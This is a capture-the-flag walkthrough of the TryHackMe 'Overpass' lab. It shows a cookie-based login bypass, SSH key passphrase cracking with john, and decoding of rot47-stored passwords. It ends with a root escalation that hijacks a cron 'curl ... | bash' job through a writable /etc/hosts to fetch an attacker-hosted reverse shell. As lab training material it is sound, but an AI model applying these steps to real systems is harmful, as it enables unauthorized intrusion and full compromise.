---
title: Overpass Writeup || Tryhackme
date: 2025-6-21 00:00:00 +0800
categories: [Tryhackme, Easy Machines]
tags: [tryhackme, writeup, walkthrough, brokenauthentication, web, scripts, crontab]     # TAG names should always be lowercase
description: This is a walkthrough for Overpass room an easy level but interesting room on Tryhackme.
---

### Scanning

What happens when a group of broke Computer Science students try to make a password manager?
Obviously a perfect commercial success!

Let's Start with scanning our target

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
```

We have just 2 ports let's see what we have on the http one

![img-description](/assets/img/Overpass/Site.png)
_Website_

All i can see is that they are just talking about there password manager, so i will have a look on the other pages and i can see that i can download the source code so let's see it.

i can see 2 interesting functions but not so usefull right now, the first one tells us that they are using **rot74** as there encryption algorithm

```
func rot47(input string) string {
        var result []string
        for i := range input[:len(input)] {
                j := int(input[i])
                if (j >= 33) && (j <= 126) {
                        result = append(result, string(rune(33+((j+14)%94))))
                } else {
                        result = append(result, string(input[i]))
                }
        }
        return strings.Join(result, "")
}
```

Second one we can deduce from it that the saved passwords are in the home directory in a file called **./overpass**

```
func main() {
        credsPath, err := homedir.Expand("~/.overpass")
        if err != nil {
                fmt.Println("Error finding home path:", err.Error())
        }
        //Load credentials
        passlist, status := loadCredsFromFile(credsPath)
        if status != "Ok" {
                fmt.Println(status)
                fmt.Println("Continuing with new password file.")
                passlist = make([]passListEntry, 0)
        }
    ......
}
```

Let's keep this in mind and continue with our website enumeration

#### Website Enumeration

While Fuzzing our application i have found directory called admin let's discover it.

![img-description](/assets/img/Overpass/Fuzz.png)
_Website_

it is a normal login page i have started by trying default credentials like admin admin and things like that but nothing have worked, also i have tried to see if we can do sql injection on it but also didn't worked.

![img-description](/assets/img/Overpass/admin.png)
_Admin_

So i have opened the source code to see if there is anything interesting in it and i have found a script called **login.js** so let's discover what is in it

### Broken Authentication

We will see that this script is validating the login process and we are concerned about this part

```
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```

The website collects the input values and Sends the credentials to **/api/login** endpoint, The response will either be:

"Incorrect credentials" -> meaning login failed

Or If the response isn’t the error message, it stores a SessionToken as the credentials is right and the user is authenticated.

As i have read the hint which is to check OWASP Top 10 Vuln, i think that There is no validation of the token's content. The client just stores whatever the server sends as a session token. That means: Even if the server doesn’t send a valid token, or if we manually create one in the console, the app will assume you’re authenticated and redirect you.

Let's try it go to the console and type this and set it as an empty one.

```
Cookies.set("SessionToken", "")
```

We will find that we now have access to the administrator area.

![img-description](/assets/img/Overpass/Access.png)
_Access_

Now we have an encrypted ssh key for the user james we need to get it's paraphrase to access the machine, put the key in a file and use **ssh2john** to start guessing our paraphrase.

```
ssh2john key > key.txt
```

then run john on the new file and let's wait

```
john key.txt --wordlist=/usr/share/wordlists/rockyou.txt               
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
james13          (key)     
1g 0:00:00:00 DONE (2025-06-20 19:19) 8.333g/s 111466p/s 111466c/s 111466C/s pink25..honolulu
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

#### User Access

and here it is so let's now access our machine and get our user flag.

**Note:-** don't forget to change the key file permissions so that you can use it without problems **chmod 700 "KeyFile"**

Then run this command to connect via ssh and enter your paraphrase and you will find that we are in now.

```
ssh -i key james@10.10.4.172
Enter passphrase for key 'key': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)
```

![img-description](/assets/img/Overpass/User.png)
_User Flag_

### Privilege Escalation

we can see that there is another file called todo.txt that seems interesting let's discover it's contents

```
james@overpass-prod:~$ cat todo.txt 
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website
```

What we can deduce from that is that he has saved his password using their password manager and there is an automated script which seems like a cronjob let's discover one by one.

as we can remember previously the passwords are saved on **./overpass** with the **rot74** algorithm which is really not strong enough as he have wrote in his todo, let's list all hidden files and see the contents now.

![img-description](/assets/img/Overpass/pass.png)
_Password_

let's take it and decrypt it using [Cyberchef](https://gchq.github.io/CyberChef) and we can see that he have specified the server as the system and here is his password.

![img-description](/assets/img/Overpass/decrypt.png)
_Password Decryption_

and as a first step let's see if he have any sudo privileges on the target but he have none.

```
james@overpass-prod:~$ sudo -l
[sudo] password for james: 
Sorry, user james may not run sudo on overpass-prod.
```

So let's go to the second thing the cron job 

```
james@overpass-prod:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

and we will see that the cron job take the file called **buildscript.sh** and pipes it into bash and it runs with root privileges, so if we changed the overpass.thm ip to our ip and insert a reverse shell inside a script with the same name in the same directory we can get root privileges so let's start.

First we will check for the /etc/hosts file permissions and hope that it is writeable

```
james@overpass-prod:~$ ls -la /etc/hosts
-rw-rw-rw- 1 root root 250 Jun 27  2020 /etc/hosts
```

and yes it is so edit the ip to your machine ip like that

![img-description](/assets/img/Overpass/ip.png)
_IP_

Second make the directories like that **downloads/src/buildscript.sh** and in this script put your reverse shell, you can generate it from here [revshells](https://www.revshells.com/)

Then open a listener with the same port you have used and go to the main directory you have all the directories with the script in them and open http server so that the target can fetch the script

```
sudo python -m http.server 80
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.4.172 - - [20/Jun/2025 19:50:36] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -
```

Now it have got the script so go to your listener and see you will find that you have root access now and here is our flag

![img-description](/assets/img/Overpass/root.png)
_Root Access_